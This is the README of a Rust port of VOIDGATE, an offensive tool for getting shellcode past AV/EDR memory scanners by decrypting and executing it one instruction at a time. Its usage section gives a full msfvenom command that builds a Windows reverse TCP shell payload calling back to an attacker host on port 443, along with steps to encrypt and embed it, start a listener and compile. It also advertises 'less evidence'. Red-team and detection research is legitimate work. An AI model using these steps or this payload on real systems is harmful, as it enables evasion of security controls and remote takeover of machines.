# VOIDGATE (Rust Rewrite)

## 🔧 Overview

This is a **Rust rewrite** of the original [VOIDGATE](https://github.com/chvancooten/VOIDGATE) project, a technique designed to **bypass AV/EDR memory scanners** by decrypting and executing shellcode **one instruction at a time**.

This Rust version maintains the core logic and behavior of the original C++ implementation while taking advantage of Rust’s features:
- Safer memory management
- Cleaner and more maintainable code structure
- Less evidence

## 📄 Technical Details

The technique, limitations, and step-by-step usage are identical to the original project.  
For full technical explanation and background, please refer to:

👉 [Original VOIDGATE C++ Repository](https://github.com/vxCrypt0r/Voidgate)

## 🛠️ Usage

1. Generate your payload using `msfvenom`:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f raw > shell.asm
   ```
2. Encrypt the payload using an XOR encryption tool (use your own or adapt the original).

3. Insert the encrypted shellcode into the Rust project source.

4. Ensure the XOR key matches between encryptor and this project. (You can use random key)

5. Start a listener on your attack machine

6. Compile and run.
   ```bash
   cargo build --release 
   ```

## 📁 Project Structure
```
voidgate/
├── src/
│   ├── main.rs          # Core logic and VEH setup
├── Cargo.toml           # Rust package manifest
└── README.md
```

## ⚠️ Disclaimer
This project is provided for educational and research purposes only.
Do not use this tool in environments where you do not have explicit authorization.
Misuse of this tool may violate laws and is strictly discouraged.
